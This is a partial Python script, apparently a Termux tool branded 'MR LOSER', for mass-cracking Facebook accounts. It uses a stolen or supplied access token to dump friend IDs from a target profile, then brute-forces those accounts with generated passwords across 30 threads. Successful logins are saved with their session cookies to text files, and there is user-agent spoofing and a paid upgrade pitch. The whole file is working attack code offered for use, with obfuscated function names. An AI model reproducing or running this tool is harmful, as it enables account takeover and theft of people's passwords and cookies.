...
def logo():
	...
	______WASIXD______(f"""%s

                                              
 __  __ ____    _     ___  ____  _____ ____   
|  \/  |  _ \  | |   / _ \/ ___|| ____|  _ \  
| |\/| | |_) | | |  | | | \___ \|  _| | |_) | 
| |  | |  _ <  | |__| |_| |___) | |___|  _ <  
|_|  |_|_| \_\ |_____\___/|____/|_____|_| \_\ 
                                              

 \033[1;91m 🥺❤️\033[1;97m═══════════MR LOSERI════ \033[1;91m🥺❤️
\033[1;91m❤️🥺 \033[1;97m═════════Wellcome New Update═══════ \033[1;91m❤️🥺
\033[1;91m🥺❤️ \033[1;97m════════Mark Zuku Ka FATHER Here═════ \033[1;91m🥺❤️

\033[1;37m ═════════════════════════════════════════════════
\033[1;91m[!]\033[1;97m Author \x1b[1;97m  : \x1b[1;97m : MR-LOSER
\033[1;37m ═════════════════════════════════════════════════
\033[1;91m[!]\033[1;97m Facebook\x1b[1;97m:  \x1b[1;97m.: MrLOSER-XD
\033[1;37m ═════════════════════════════════════════════════
\033[1;91m[!]\033[1;97m GitHub\x1b[1;97m  :  \x1b[1;97m :EMPTY
\033[1;37m ═════════════════════════════════════════════════
\033[1;91m[!]\033[1;97m Version\x1b[1;97m : \x1b[1;97m : 4.1.1
\033[1;37m ═════════════════════════════════════════════════
"""%(N))
         
def R():
	os.system('xdg-open https://youtube.com/channel/UCHAmSm6DAx9EdkqB01AA7fQ')
	try:
		...
		logo()
		______WASIXD______(f" \n {P}[{H}!{P}] USED FRESH BUSSINESS (EAAB) TOKEN \n {P}[{H}!{P}] If the token is not EAAB then it will fail Dump")
		token = ______WASI______(f'{P} [{H}?{P}] Token : ')
		try:
			...
			______WASIXD______("\n %s[%s•%s] Selamat Datang %s%s"%(P,H,P,H,Name));time.sleep(00.9)
			______WASIXD______(" %s[%s•%s] Gunakan Tools Ini Dengan Bijak "%(P,H,P));time.sleep(00.9)
			______WASIXD______(" %s[%s•%s] Saya Tidak Bertanggung Jawab Jika Terjadi Sesuatu "%(P,H,P));time.sleep(00.9)
			______WASI______(" %s[%s•%s] ENTER "%(P,H,P));time.sleep(3)
			_____bot________();___SayaRecodeSampah___()
		except KeyError:
			______WASIXD______(f'{P} [{M}!{P}] Token Kadaluarsa')
			______LuWibu______() 
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m{ WASI-XD} \033[1;97m%s/%s   \033[1;97m{ OK-:%s }  \033[1;97m{ CP-:%s } '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;97m{WASI-OK} %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				...
				try:
					...
					cp.append(wrt)
					open('/sdcard/LOSER_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;97m{LOSER-CP} %s | %s%s      ' % (user,pw,tahun(user)))
		...
		loop += 1
	def __pler__(self):
		print ("\033[1;97m {1} Auto 5 Pass { P-R-O } ")
		print (" {2} Auto 2 Digit Pass { B-E-S-T -O-K} ")
		...
		if yan == '':
			...
			time.sleep(1)
			print('\n{♡} Result OK saved to LOSER-OK.txt')
			print('{♡} Result CP saved to LOSER-CP.txt')
			print('\n\tCrack Processing...\n')
			print('\n\tCrack Processing...\n\n');logo()
...
def __cekakun__():
    ______WASIXD______(f" \n {P}[{H}1{P}] Cek results OK ")
    ______WASIXD______(f" {P}[{H}2{P}] Cek results CP ")
    anjg = ______WASI______(f" \n {P}[{H}?{P}] Chose : ")
    if anjg == '':
        ___SayaRecodeSampah___()
    elif anjg == '01' or anjg == '1':
        ______SAYANGKAMU______(' cat wasiok.txt')
        ______WASI______('\n [\xe2\x80\xa2] Kembali ')
        ___SayaRecodeSampah___()
    elif anjg == '02' or anjg == '2':
        totalcp = open('wasicp.txt').read().splitlines()
        ______SAYANGKAMU______(' cat wasicp.txt')
        ______WASI______('\n [\xe2\x80\xa2] kembali ')
        ___SayaRecodeSampah___()
    else:
        ______WASIXD______( ' [!] Chose yang benar!!')
        ___SayaRecodeSampah___()
def __upgrade__():
	______WASIXD______(' [!] Wait');time.sleep(3)
	______WASI______(' >>> Enter ')
	______SAYANGKAMU______('am start https://wa.me/+923118933642?text=Assalamualaikum,+Bang+Dicky,+Saya+Ingin+Upgrade+Premium+%20>/dev/null')
...
def _____Publik_______():
	try:
		...
		______LuWibu______()
	______WASIXD______(P+'\n ['+h+'•'+P+'] Type "me" if you want to dump ID from friends')
	pil = ______WASI______(P+' ['+h+'?'+P+'] Enter Public ID : ')
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		______WASIXD______(P+' ['+h+'•'+P+'] Name  : '+str(grex))
	except (KeyError,IOError):
		______WASIXD______(P+' ['+h+'!'+P+'] ID TIDAK DITEMUKAN')
		______LuWibu______()
	except requests.exceptions.ConnectionError:
		______WASIXD______(P+' ['+h+'!'+P+'] KONESI INTERNET TIDAK STABIL')
		______LuWibu______()
	try:
		...
		______WASIXD______(P+' ['+h+'•'+P+'] Total : '+str(len(id)))
	except requests.exceptions.ConnectionError:
		______WASIXD______(P+' ['+h+'!'+P+'] KONEKSI INTERNET BERMASALAH')
		______LuWibu______()
	except (KeyError,IOError):
		______WASIXD______(P+' ['+h+'!'+P+'] TARGET FRIENDSHIP NOT PUBLISHED')
		______LuWibu______()
	______WASIXD______(f" \n {P}[{H}?{P}] do you want to use manual password? [Y/t] ")
	ask=______WASI______(" %s[%s?%s] %sChose :%s "%(p,H,p,p,p))
	if ask in[""]:
...
def _____LANGSUNG_____():
	______WASIXD______("")
	______WASIXD______(' %s[%s+%s] %sresults %sOK %ssaved to -> %sloserok.txt'%(p,p,p,p,p,p,H))
	______WASIXD______(' %s[%s+%s] %sresults %sCP %ssaved to -> %sloser.txt'%(p,p,p,p,p,p,K))
	______QURESHI______(" %s[%s!%s] %sIf %sno %sresults airplane-> %s5 second\n"%(p,M,p,p,p,p,p))
...
### MANUAL ###
def ____MANUAL_____():
	______WASIXD______(" %s[%s!%s] %sgunakan , (%skoma%s) sebagai pemisah"%(p,p,p,p,p,N))
	pwek=______WASI______(' %s[%s?%s] %sbuat kata sandi :%s '%(p,p,p,p,p,H))
	if pwek=="":
		______LuWibu______(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		______LuWibu______(" %s[!] masukan sandi minimal 6 angka!"%(M))
		______WASIXD______(' %s[%s+%s] %sresults %sOK %ssaved to -> %swasiok.txt'%(p,p,p,p,p,p,H))
		______WASIXD______(' %s[%s+%s] %sresults %sCP %ssaved to -> %swasicp.txt'%(p,p,p,p,p,p,K))
		with ThreadPoolExecutor(max_workers=30) as dicky:
			for user in id:
				uid, name = user.split("|")
...
def apii(uid, pwx):
	...
	for pw in pwx:
		...
		if "c_user" in ses.cookies.get_dict().keys():
			...
			______WASIXD______("\r %s[OK] %s • %s • %s         "%(H,uid, pw,kukis))
			ok.append("%s • %s"%(uid, pw))
			open("wasiok.txt","a").write(" [OK] %s • %s • %s\n"%(uid, pw,kukis))
			break
			...
			try:
				...
				month = bulan[month]
				______WASIXD______("\r %s\x1b[1;93m[CP] %s • %s • %s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s • %s"%(uid, pw))
				open("wasicp.txt","a").write("  * --> %s • %s • %s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
			...
			______WASIXD______("\r %s\x1b[1;93m[CP] %s • %s         "%(K,uid, pw))
			cp.append("%s • %s"%(uid, pw))
			open("wasicp.txt","a").write("  * --> %s • %s\n"%(uid, pw))
			break
		else:
			continue
...
def __useragent__():
	...
	______WASIXD______(f" {P}[{H}2{P}] Use UserAgent Tools")
	ua = ______WASI______(f" {P}[{H}?{P}] Choose : ")
	if ua =="":
		______LuWibu______(f" {P}[{H}!{P}]Option None")
	elif ua == "1":
		c_ua = ______WASI______(f" \n {P}[{H}?{P}] Enter User-Agent : ")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		______WASI______(f" \n {P}[{H}✔{P}] Press Enter To Save User-Agent")
		___SayaRecodeSampah___()
	elif ua == "2":
		______WASIXD______("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
...
def ___SayaRecodeSampah___():
	...
	try:
		...
		______WASIXD______(f'{P} [{H}!{P}] Token Invalid')
		______SAYANGKAMU______('clear')
		______SAYANGKAMU______('rm -rf login.txt')
		main_apv()
	except requests.exceptions.ConnectionError:
	...
	try:
		...
		______SAYANGKAMU______('clear')
		______WASIXD______(f'{P} [{M}×{P}] Token Invalid')
		______SAYANGKAMU______('rm -rf login.txt')
		main_apv()
	except requests.exceptions.ConnectionError:
		______LuWibu______(f'{P} [{M}!{P}] No Connection')
	logo()
	______WASIXD______(f" {P}[{H}->{P}] Name    : %s \n {P}[{H}->{P}] ID      : %s \n {P}[{H}->{P}] IP      : %s \n {P}[{H}->{P}] Status  : {H}FREE{P}"%(Name,uid,_______IP_______))
	______WASIXD______(f" \n {P}[{H}1{P}] Crack From Public ID \n {P}[{H}2{P}] Check Results OK/CP\n {P}[{H}3{P}] Setting UserAgent \n {P}[{H}4{P}] Upgrade {H}Pro \n {P}[{H}0{P}] Exit ( Logout")
	ask = ______WASI______(f" {P}[{U}?{P}] Choose : ")
	...
	elif ask in ['0','00','000','e']:______SAYANGKAMU______("rm -f login.txt");______LOSER______(f" {P}[{H}✔{P}] Successfully Delete Token");______LuWibu______()
